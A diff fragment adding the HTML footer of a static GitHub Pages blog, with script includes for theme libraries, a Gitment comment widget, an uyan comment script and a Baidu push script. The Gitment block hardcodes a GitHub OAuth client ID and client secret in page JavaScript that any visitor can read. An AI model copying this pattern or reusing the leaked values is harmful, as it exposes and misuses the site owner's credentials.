+  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+  
+  <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.0.1"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.0.1"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.0.1"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.0.1"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.0.1"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.0.1"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.0.1"></script>
+
+
+
+  
+
+
+
+  
+
+
+
+
+    <link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css">
+    <script src="https://imsun.github.io/gitment/dist/gitment.browser.js"></script>
+    <script type="text/javascript">
+        (function() {
+            var id = '';
+            var owner = 'XuCcc';
+            var repo = 'XuCcc.github.io';
+            var clientId = 'f03b9d3d14222e890fdc';
+            var clientSecret = '676341561e48fad43015c644798175b16ee69fe0';
+
+            var gitment = new Gitment({
+                owner: owner,
+                repo: repo,
+                oauth: {
+                    client_id: clientId,
+                    client_secret: clientSecret,
+                },
+            });
+            gitment.render('comments');
+        })();
+    </script>
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+      <!-- UY BEGIN -->
+      <script type="text/javascript" src="http://v2.uyan.cc/code/uyan.js?uid="></script>
+      <!-- UY END -->
+  
+
+
+
+
+  
+  
+
+  
+
+  
+
+  
+<script type="text/javascript" async src="//push.zhanzhang.baidu.com/push.js">
+</script>
+
+
+</body>
+</html>
